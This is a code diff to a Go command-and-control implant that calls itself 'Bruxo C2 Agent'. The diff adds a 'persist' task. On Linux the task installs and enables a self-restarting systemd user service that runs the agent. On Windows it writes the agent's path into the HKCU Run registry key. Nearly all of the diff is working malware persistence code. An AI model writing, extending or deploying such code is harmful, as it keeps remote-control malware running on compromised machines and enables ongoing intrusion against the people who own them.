@@ -8,9 +8,12 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"runtime"
 	"strings"
 	"time"
+
+	"golang.org/x/sys/windows/registry"
 )
 
 var (
@@ -100,6 +103,8 @@ func executeTask(task Task) string {
 	command := parts[0]
 
 	switch command {
+	case "persist":
+		return handlePersistence()
 	case "upload":
 		if len(parts) < 2 {
 			return "Usage: upload <local_file_path>"
@@ -167,6 +172,81 @@ func handleDownload(fileURL, destPath string) string {
 	}
 
 	return fmt.Sprintf("File downloaded from '%s' and saved to '%s'", fileURL, destPath)
+}
+
+func handlePersistence() string {
+	switch runtime.GOOS {
+	case "linux":
+		return persistLinux()
+	case "windows":
+		return persistWindows()
+	default:
+		return fmt.Sprintf("Persistence not supported on %s", runtime.GOOS)
+	}
+}
+
+func persistLinux() string {
+	exePath, err := os.Executable()
+	if err != nil {
+		return "Error getting executable path: " + err.Error()
+	}
+
+	homeDir, err := os.UserHomeDir()
+	if err != nil {
+		return "Error getting user home directory: " + err.Error()
+	}
+
+	serviceDir := filepath.Join(homeDir, ".config", "systemd", "user")
+	if err := os.MkdirAll(serviceDir, 0755); err != nil {
+		return "Error creating systemd user directory: " + err.Error()
+	}
+
+	servicePath := filepath.Join(serviceDir, "bruxo-agent.service")
+	serviceContent := fmt.Sprintf(`[Unit]
+Description=Bruxo C2 Agent
+
+[Service]
+ExecStart=%s
+Restart=always
+
+[Install]
+WantedBy=default.target
+`, exePath)
+
+	if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
+		return "Error writing systemd service file: " + err.Error()
+	}
+
+	cmdReload := exec.Command("systemctl", "--user", "daemon-reload")
+	if err := cmdReload.Run(); err != nil {
+		return "Error reloading systemd daemon: " + err.Error()
+	}
+
+	cmdEnable := exec.Command("systemctl", "--user", "enable", "--now", "bruxo-agent.service")
+	if err := cmdEnable.Run(); err != nil {
+		return "Error enabling systemd service: " + err.Error()
+	}
+
+	return "Persistence established successfully via systemd user service."
+}
+
+func persistWindows() string {
+	exePath, err := os.Executable()
+	if err != nil {
+		return "Error getting executable path: " + err.Error()
+	}
+
+	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
+	if err != nil {
+		return "Error opening registry key: " + err.Error()
+	}
+	defer key.Close()
+
+	if err := key.SetStringValue("BruxoAgent", exePath); err != nil {
+		return "Error setting registry value: " + err.Error()
+	}
+
+	return "Persistence established successfully via Windows Registry."
 }
 
 func postResult(taskID, result string) error {
